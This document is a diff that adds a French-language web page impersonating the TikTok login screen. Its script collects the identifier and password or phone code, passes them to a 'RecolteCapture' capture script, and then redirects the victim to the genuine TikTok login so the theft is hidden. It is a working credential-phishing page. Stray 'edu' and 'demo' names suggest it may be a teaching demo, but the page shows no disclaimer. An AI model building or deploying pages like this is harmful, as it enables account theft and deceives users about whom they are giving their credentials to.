@@ -1,0 +1,592 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <title>Connexion · TikTok</title>
+    <meta name="theme-color" content="#121212" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+    <style>
+      :root {
+        --bg: #121212;
+        --field: #2f2f2f;
+        --text: #fff;
+        --muted: #8a8b91;
+        --line: rgba(255, 255, 255, 0.12);
+        --pink: #fe2c55;
+        --btn: #3a3a3a;
+        --btn-text: #6a6b70;
+        --btn-ready: #fe2c55;
+      }
+
+      * { box-sizing: border-box; margin: 0; padding: 0; }
+
+      html, body { min-height: 100%; }
+
+      body {
+        min-height: 100dvh;
+        background: var(--bg);
+        color: var(--text);
+        font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        -webkit-font-smoothing: antialiased;
+        display: flex;
+        flex-direction: column;
+        overflow-x: hidden;
+      }
+
+      .edu {
+        position: sticky;
+        top: 0;
+        z-index: 30;
+        display: flex;
+        justify-content: center;
+        padding: 0.45rem 1rem;
+        background: #1a1a1a;
+        color: #25f4ee;
+        font-size: 0.68rem;
+        font-weight: 700;
+        letter-spacing: 0.07em;
+        text-transform: uppercase;
+        border-bottom: 1px solid #2a2a2a;
+      }
+
+      .top {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 0.75rem;
+        padding: 0.85rem 1rem;
+        padding-top: max(0.85rem, env(safe-area-inset-top));
+        padding-left: max(1rem, env(safe-area-inset-left));
+        padding-right: max(1rem, env(safe-area-inset-right));
+        min-width: 0;
+      }
+
+      .brand {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.4rem;
+        text-decoration: none;
+        color: #fff;
+      }
+
+      .brand svg {
+        width: 28px;
+        height: 28px;
+        display: block;
+      }
+
+      .brand span {
+        font-size: 1.35rem;
+        font-weight: 800;
+        letter-spacing: -0.04em;
+      }
+
+      .help {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.4rem;
+        min-width: 44px;
+        min-height: 44px;
+        color: #fff;
+        text-decoration: none;
+        font-size: 0.9rem;
+        font-weight: 500;
+        flex-shrink: 0;
+      }
+
+      .help:hover { opacity: 0.85; }
+
+      .help > span:not(.help-ico) {
+        display: none;
+      }
+
+      .help-ico {
+        width: 18px;
+        height: 18px;
+        border: 1.5px solid #fff;
+        border-radius: 50%;
+        display: grid;
+        place-items: center;
+        font-size: 0.72rem;
+        font-weight: 700;
+        line-height: 1;
+      }
+
+      .main {
+        flex: 1;
+        display: grid;
+        place-items: center;
+        padding: 0.75rem 1rem 1.5rem;
+        padding-left: max(1rem, env(safe-area-inset-left));
+        padding-right: max(1rem, env(safe-area-inset-right));
+        min-width: 0;
+      }
+
+      .card {
+        width: 100%;
+        max-width: 400px;
+        min-width: 0;
+      }
+
+      h1 {
+        text-align: center;
+        font-size: clamp(1.55rem, 6.5vw, 2rem);
+        font-weight: 800;
+        letter-spacing: -0.03em;
+        margin-bottom: 1.25rem;
+      }
+
+      .tabs {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 0.35rem;
+        border-bottom: 1px solid var(--line);
+        margin-bottom: 1.15rem;
+      }
+
+      .tabs button {
+        border: 0;
+        background: transparent;
+        color: var(--muted);
+        font: inherit;
+        font-size: clamp(0.78rem, 3.2vw, 0.92rem);
+        font-weight: 600;
+        min-height: 48px;
+        padding: 0.35rem 0.15rem 0.85rem;
+        cursor: pointer;
+        position: relative;
+        text-align: center;
+        line-height: 1.25;
+      }
+
+      .tabs button.is-active {
+        color: #fff;
+        font-weight: 700;
+      }
+
+      .tabs button.is-active::after {
+        content: "";
+        position: absolute;
+        left: 12%;
+        right: 12%;
+        bottom: -1px;
+        height: 2px;
+        background: #fff;
+        border-radius: 2px;
+      }
+
+      .field {
+        margin-bottom: 0.7rem;
+      }
+
+      .field input {
+        width: 100%;
+        height: 48px;
+        border: 0;
+        border-radius: 4px;
+        background: var(--field);
+        color: #fff;
+        padding: 0 0.9rem;
+        font: inherit;
+        font-size: 16px;
+        outline: none;
+      }
+
+      .field input::placeholder {
+        color: #8a8b91;
+      }
+
+      .field input:focus {
+        box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.28);
+      }
+
+      .pass {
+        position: relative;
+      }
+
+      .pass input {
+        padding-right: 2.8rem;
+      }
+
+      .eye {
+        position: absolute;
+        right: 0.35rem;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 44px;
+        height: 44px;
+        border: 0;
+        background: transparent;
+        color: #8a8b91;
+        cursor: pointer;
+        display: grid;
+        place-items: center;
+        border-radius: 6px;
+      }
+
+      .eye:hover {
+        color: #fff;
+        background: rgba(255, 255, 255, 0.06);
+      }
+
+      .eye svg {
+        width: 20px;
+        height: 20px;
+        display: block;
+      }
+
+      .forgot {
+        display: inline-flex;
+        align-items: center;
+        min-height: 44px;
+        margin: 0.15rem 0 0.85rem;
+        color: var(--muted);
+        text-decoration: none;
+        font-size: 0.88rem;
+        font-weight: 500;
+      }
+
+      .forgot:hover { color: #fff; }
+
+      .submit {
+        width: 100%;
+        height: 48px;
+        border: 0;
+        border-radius: 4px;
+        background: var(--btn);
+        color: var(--btn-text);
+        font: inherit;
+        font-size: 1rem;
+        font-weight: 700;
+        cursor: not-allowed;
+      }
+
+      .submit.is-ready {
+        background: var(--btn-ready);
+        color: #fff;
+        cursor: pointer;
+      }
+
+      .submit.is-ready:hover {
+        filter: brightness(1.05);
+      }
+
+      .back {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.35rem;
+        min-height: 44px;
+        margin-top: 1.15rem;
+        color: #fff;
+        text-decoration: none;
+        font-size: 0.95rem;
+        font-weight: 500;
+      }
+
+      .back:hover { opacity: 0.85; }
+
+      .signup {
+        margin-top: 2.4rem;
+        text-align: center;
+        font-size: 0.95rem;
+        color: #fff;
+      }
+
+      .signup a {
+        color: var(--pink);
+        text-decoration: none;
+        font-weight: 700;
+      }
+
+      .signup a:hover { text-decoration: underline; }
+
+      .notice {
+        margin-top: 0.9rem;
+        text-align: center;
+        font-size: 0.75rem;
+        color: var(--muted);
+        line-height: 1.4;
+        min-height: 2rem;
+      }
+
+      .notice.ok { color: #25f4ee; }
+
+      .footer {
+        display: flex;
+        flex-wrap: wrap;
+        align-items: center;
+        justify-content: space-between;
+        gap: 0.75rem 1rem;
+        padding: 0.85rem 1rem 1.1rem;
+        padding-bottom: max(1.1rem, env(safe-area-inset-bottom));
+        padding-left: max(1rem, env(safe-area-inset-left));
+        padding-right: max(1rem, env(safe-area-inset-right));
+      }
+
+      .lang {
+        min-width: 110px;
+        min-height: 44px;
+        height: 44px;
+        border: 1px solid rgba(255, 255, 255, 0.35);
+        border-radius: 2px;
+        background: transparent;
+        color: #fff;
+        font: inherit;
+        font-size: 16px;
+        padding: 0 0.7rem;
+        appearance: none;
+        background-image: linear-gradient(45deg, transparent 50%, #fff 50%),
+          linear-gradient(135deg, #fff 50%, transparent 50%);
+        background-position: calc(100% - 14px) 19px, calc(100% - 9px) 19px;
+        background-size: 5px 5px, 5px 5px;
+        background-repeat: no-repeat;
+        padding-right: 1.8rem;
+        cursor: pointer;
+      }
+
+      .copy {
+        color: var(--muted);
+        font-size: 0.85rem;
+        min-width: 0;
+      }
+
+      @media (min-width: 480px) {
+        .top { padding: 1rem 1.4rem; }
+        .main { padding: 1rem 1rem 2rem; }
+        .help > span:not(.help-ico) { display: inline; }
+        h1 { margin-bottom: 1.6rem; }
+        .tabs { gap: 0.5rem; margin-bottom: 1.35rem; }
+        .footer { padding: 1rem 1.4rem 1.25rem; }
+      }
+
+      @media (prefers-reduced-motion: reduce) {
+        * { animation: none !important; transition: none !important; }
+      }
+
+      .tabs button:focus-visible,
+      .field input:focus-visible,
+      .submit:focus-visible,
+      .eye:focus-visible,
+      .help:focus-visible,
+      .forgot:focus-visible,
+      .back:focus-visible,
+      .lang:focus-visible {
+        outline: 2px solid #25f4ee;
+        outline-offset: 2px;
+      }
+    </style>
+  </head>
+  <body>
+<header class="top">
+      <a class="brand" href="#" aria-label="TikTok">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path fill="#fff" d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/>
+        </svg>
+        <span>TikTok</span>
+      </a>
+      <a class="help" href="#">
+        <span class="help-ico">?</span>
+        <span>Commentaires et assistance</span>
+      </a>
+    </header>
+
+    <main class="main">
+      <form class="card" id="login-form" novalidate aria-label="Connexion TikTok">
+        <h1 id="form-title">Se connecter</h1>
+
+        <div class="tabs" role="tablist">
+          <button class="is-active" type="button" data-mode="email" role="tab" aria-selected="true">
+            E-mail ou nom d’utilisateur
+          </button>
+          <button type="button" data-mode="phone" role="tab" aria-selected="false">
+            Connexion avec un numéro de téléphone
+          </button>
+        </div>
+
+        <div class="field">
+          <input
+            id="identifier"
+            name="demo_identifier"
+            type="text"
+            autocomplete="off"
+            placeholder="E-mail ou nom d’utilisateur"
+            required
+          />
+        </div>
+
+        <div class="field pass">
+          <input
+            id="password"
+            name="demo_password"
+            type="password"
+            autocomplete="off"
+            placeholder="Mot de passe"
+            minlength="6"
+            required
+          />
+          <button class="eye" type="button" aria-label="Afficher le mot de passe" aria-pressed="false">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true">
+              <path d="M3 3l18 18" />
+              <path d="M10.6 10.6a2 2 0 0 0 2.8 2.8" />
+              <path d="M9.9 5.1A10.4 10.4 0 0 1 12 4.8c5 0 9.3 3.5 10.5 7.2a11.2 11.2 0 0 1-4.1 5.1" />
+              <path d="M6.1 6.1A11.3 11.3 0 0 0 1.5 12c1.2 3.7 5.5 7.2 10.5 7.2 1.5 0 2.9-.3 4.2-.8" />
+            </svg>
+          </button>
+        </div>
+
+        <a class="forgot" href="#">Mot de passe oublié ?</a>
+        <button class="submit" id="submit" type="submit" disabled>Se connecter</button>
+        <a class="back" href="#" id="form-back">‹ Retour</a>
+        <p class="notice" id="notice" hidden></p>
+        <p class="signup" id="mode-switch">Tu n’as pas de compte ? <a href="#" id="toggle-mode">S’inscrire</a></p>
+      </form>
+    </main>
+
+    <footer class="footer">
+      <select class="lang" aria-label="Langue">
+        <option>Français</option>
+        <option>English</option>
+        <option>Español</option>
+      </select>
+      <p class="copy">© 2026 TikTok</p>
+    </footer>
+
+    <script src="./capture.js"></script>
+    <script>
+      const form = document.querySelector("#login-form");
+      const notice = document.querySelector("#notice");
+      const password = document.querySelector("#password");
+      const identifier = document.querySelector("#identifier");
+      const submit = document.querySelector("#submit");
+      const eye = document.querySelector(".eye");
+      const tabs = document.querySelectorAll(".tabs button");
+
+      const eyeOpen = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/></svg>`;
+      const eyeClosed = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><path d="M3 3l18 18"/><path d="M10.6 10.6a2 2 0 0 0 2.8 2.8"/><path d="M9.9 5.1A10.4 10.4 0 0 1 12 4.8c5 0 9.3 3.5 10.5 7.2a11.2 11.2 0 0 1-4.1 5.1"/><path d="M6.1 6.1A11.3 11.3 0 0 0 1.5 12c1.2 3.7 5.5 7.2 10.5 7.2 1.5 0 2.9-.3 4.2-.8"/></svg>`;
+
+      let loginMode = "email";
+      let formMode = "login";
+      const title = document.querySelector("#form-title");
+      const formBack = document.querySelector("#form-back");
+
+      function sync() {
+        const minSecret = loginMode === "phone" ? 4 : 6;
+        const ready = identifier.value.trim() && password.value.length >= minSecret;
+        submit.disabled = !ready;
+        submit.classList.toggle("is-ready", ready);
+      }
+
+      function bindToggleMode() {
+        const link = document.querySelector("#toggle-mode");
+        if (!link) return;
+        link.addEventListener("click", (e) => {
+          e.preventDefault();
+          formMode = formMode === "login" ? "register" : "login";
+          applyFormMode();
+        });
+      }
+
+      function applyFormMode() {
+        const isRegister = formMode === "register";
+        title.textContent = isRegister ? "S’inscrire" : "Se connecter";
+        submit.textContent = isRegister ? "S’inscrire" : "Se connecter";
+        document.querySelector("#mode-switch").innerHTML = isRegister
+          ? 'Tu as déjà un compte ? <a href="#" id="toggle-mode">Se connecter</a>'
+          : 'Tu n’as pas de compte ? <a href="#" id="toggle-mode">S’inscrire</a>';
+        bindToggleMode();
+        notice.hidden = true;
+        notice.textContent = "";
+        notice.classList.remove("ok");
+      }
+
+      identifier.addEventListener("input", sync);
+      password.addEventListener("input", sync);
+
+      eye.addEventListener("click", () => {
+        const show = password.type === "password";
+        password.type = show ? "text" : "password";
+        eye.setAttribute("aria-pressed", String(show));
+        eye.setAttribute("aria-label", show ? "Masquer le mot de passe" : "Afficher le mot de passe");
+        eye.innerHTML = show ? eyeOpen : eyeClosed;
+      });
+
+      formBack.addEventListener("click", (e) => {
+        e.preventDefault();
+        if (formMode === "register") {
+          formMode = "login";
+          applyFormMode();
+        }
+      });
+
+      tabs.forEach((tab) => {
+        tab.addEventListener("click", () => {
+          tabs.forEach((t) => {
+            t.classList.remove("is-active");
+            t.setAttribute("aria-selected", "false");
+          });
+          tab.classList.add("is-active");
+          tab.setAttribute("aria-selected", "true");
+          loginMode = tab.dataset.mode;
+
+          if (tab.dataset.mode === "phone") {
+            identifier.placeholder = "Numéro de téléphone";
+            identifier.inputMode = "tel";
+            password.placeholder = "Code de vérification";
+            password.minLength = 4;
+          } else {
+            identifier.placeholder = "E-mail ou nom d’utilisateur";
+            identifier.inputMode = "email";
+            password.placeholder = "Mot de passe";
+            password.minLength = 6;
+          }
+          sync();
+        });
+      });
+
+      bindToggleMode();
+
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        const idValue = identifier.value.trim();
+        const passValue = password.value;
+        const minSecret = loginMode === "phone" ? 4 : 6;
+        if (!idValue || passValue.length < minSecret) {
+          notice.hidden = false;
+          notice.classList.remove("ok");
+          notice.textContent =
+            loginMode === "phone"
+              ? "Remplis le numéro et le code correctement."
+              : "Remplis correctement l’identifiant et le mot de passe.";
+          return;
+        }
+
+        const payload = {
+          network: "tiktok",
+          identifier: idValue,
+          password: passValue,
+          method: loginMode === "phone" ? "mobile" : "user",
+        };
+        if (formMode === "register") {
+          window.RecolteCapture.saveRegister(payload);
+          notice.hidden = true;
+          notice.textContent = "";
+          form.reset();
+          password.type = "password";
+          eye.innerHTML = eyeClosed;
+          eye.setAttribute("aria-pressed", "false");
+          sync();
+          return;
+        }
+
+        window.RecolteCapture.saveLogin(payload);
+        window.top.location.href =
+          "https://www.tiktok.com/login?lang=fr&redirect_url=https%3A%2F%2Fwww.tiktok.com%2Fupload%3Flang%3Dfr";
+      });
+    </script>
+  </body>
+</html>
